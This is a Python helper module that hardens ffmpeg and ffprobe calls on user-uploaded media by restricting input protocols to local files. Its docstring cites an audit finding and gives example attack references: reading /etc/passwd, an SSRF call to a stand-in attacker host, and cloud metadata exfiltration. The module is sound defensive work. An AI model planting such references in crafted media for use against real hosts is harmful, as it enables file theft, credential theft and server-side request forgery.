"""Safe argv prefixes for ffmpeg / ffprobe invocations on user input.

Audit finding CR-6 — every ffmpeg / ffprobe call in this codebase reads a
local temp file written from user-supplied bytes. Without
`-protocol_whitelist`, libavformat will follow URI references found INSIDE
the container (Matroska `dataref`, MOV `url`/`dref` boxes, HLS segment
URIs, concat demuxer entries, SDP descriptions, etc.) to fetch additional
data. A crafted MKV / MOV / M3U8 can therefore reference:

  - `file:///etc/passwd` → exfiltrate filesystem contents into the
    encoded output (read-anywhere primitive)
  - `http://attacker.example/leak?…` → SSRF off the encoder host,
    optionally including `Authorization` headers if any
  - `http://169.254.169.254/latest/meta-data/…` → cloud-instance
    metadata exfil (AWS / GCP / Azure IMDS)
  - HLS demuxer entries → known CVE chain (CVE-2017-9993,
    CVE-2019-1010135, CVE-2022-2566 et al.) for RCE

Pinning the protocol whitelist to just `file` blocks every one of the
above. Centralized here so a future call site inherits the safe default
automatically, and so a future relaxation of the policy is exactly one
edit to one module — easy to spot in code review.
"""
from __future__ import annotations

from typing import Sequence


# Input-side protocols. `file` is sufficient for every existing call
# site (we always write user bytes to a local temp file before invoking
# ffmpeg/ffprobe). Adding `crypto` would only be necessary if we
# accepted encrypted HLS input, which we don't. Keep this tight.
_INPUT_PROTOCOL_WHITELIST = "file"


def safe_input_args() -> list[str]:
    """Argv tokens to insert before EACH `-i <user_path>` in an
    ffmpeg / ffprobe invocation.

    Usage pattern::

        cmd = [
            "ffmpeg", "-hide_banner", "-loglevel", "error",
            *safe_input_args(),
            "-i", user_path,
            ...
        ]

    Per ffmpeg's semantics, `-protocol_whitelist` is a per-input option;
    placing it before `-i` scopes it to the next input. For invocations
    with multiple `-i` flags, call `safe_input_args()` before each of
    them. None of our current call sites take multiple inputs.
    """
    return ["-protocol_whitelist", _INPUT_PROTOCOL_WHITELIST]
